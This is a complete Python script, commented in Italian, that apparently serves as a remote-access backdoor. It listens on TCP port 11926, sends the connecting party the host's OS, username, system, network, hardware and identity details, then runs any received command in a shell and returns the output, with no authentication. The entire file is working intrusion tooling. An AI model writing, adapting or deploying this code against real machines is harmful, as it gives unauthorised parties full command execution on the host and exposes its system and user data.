from socket import *
import subprocess
import os
from pathlib import Path
import traceback
import getpass
import platform


def connect():
    serverPort = 11926
    clientSocket = socket(AF_INET,SOCK_STREAM) #SOCK_STREAM = TCP
                                                #socket(...) e' il costruttore della classe socket
    clientSocket.bind( ('',serverPort) ) #collega la socket al port 1200
                                        #la variabile passata e' una t-pla, indicata con la parentesi tonda e NON e' modificabile
    clientSocket.listen(1) #si mette in ascolto, 1 indica la dimensione della coda dei client
    print ('The client is ready to receive')

    connectionSocket, addr = clientSocket.accept()
    print('Accepted a new server', addr)

    return clientSocket, connectionSocket


def setup_windows(connectionSocket):

    connectionSocket.send(command("systeminfo").encode(encoding='latin-1'))
    connectionSocket.send(command("ipconfig").encode(encoding='latin-1'))
    connectionSocket.send(command("getmac").encode(encoding='latin-1'))
    connectionSocket.send(command("netstat -p TCP").encode(encoding='latin-1'))
    connectionSocket.send(command("netstat -p UDP").encode(encoding='latin-1'))



def setup_linux(connectionSocket):

    connectionSocket.send(command("cat /etc/machine-id ").encode(encoding='latin-1'))
    connectionSocket.send(command("cat /etc/os-release").encode(encoding='latin-1'))
    connectionSocket.send(command("cat /proc/meminfo ").encode(encoding='latin-1'))
    connectionSocket.send(command("cat /proc/cpuinfo ").encode(encoding='latin-1'))

    connectionSocket.send(command("lscpu").encode(encoding='latin-1'))    
    connectionSocket.send(command("lshw").encode(encoding='latin-1'))
    connectionSocket.send(command("ifconfig").encode(encoding='latin-1'))
    connectionSocket.send(command("netstat -t").encode(encoding='latin-1'))
    connectionSocket.send(command("netstat -u").encode(encoding='latin-1'))
    connectionSocket.send(command("id").encode(encoding='latin-1'))


def setup_mac(connectionSocket):

    connectionSocket.send(command("lscpu").encode(encoding='latin-1'))
    connectionSocket.send(command("lshw").encode(encoding='latin-1'))
    connectionSocket.send(command("ifconfig").encode(encoding='latin-1'))
    connectionSocket.send(command("netstat -t").encode(encoding='latin-1'))
    connectionSocket.send(command("netstat -u").encode(encoding='latin-1'))
    connectionSocket.send(command("id").encode(encoding='latin-1'))



def setup(connectionSocket):


    system = platform.system()
    os.chdir(Path.home())

    connectionSocket.send(system.encode(encoding='latin-1'))
    connectionSocket.send(getpass.getuser().encode(encoding='latin-1'))


    if system == 'Windows':
        setup_windows(connectionSocket)
    
    if system == 'Linux':
        setup_linux(connectionSocket)
    
    if system == 'Darwin':
        setup_mac(connectionSocket)

    connectionSocket.send("uscita".encode(encoding='latin-1'))
    


def command(cmd):

    if cmd.startswith("cd") :

        if not((cmd[2:]).isspace() or len(cmd)==2) :
            os.chdir(cmd[3:])
        result = os.getcwd()

    else:
            
        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, encoding='latin-1').stdout

        if result == '':
            result = "comando non valido\n"

    return result


def main():
    
    clientSocket, connectionSocket = connect()

    setup(connectionSocket)

    result = ''

    while True:
        try:
            cmd = connectionSocket.recv(1048576).decode(encoding='latin-1')
            
            if cmd == "esc":
                break

            result = command(cmd)

        except:
            result = "Errore\n"

        finally:
            connectionSocket.send(result.encode(encoding='latin-1'))


    clientSocket.close()
    print("\nConnection closed\n")
    

if __name__ == "__main__":
    main()

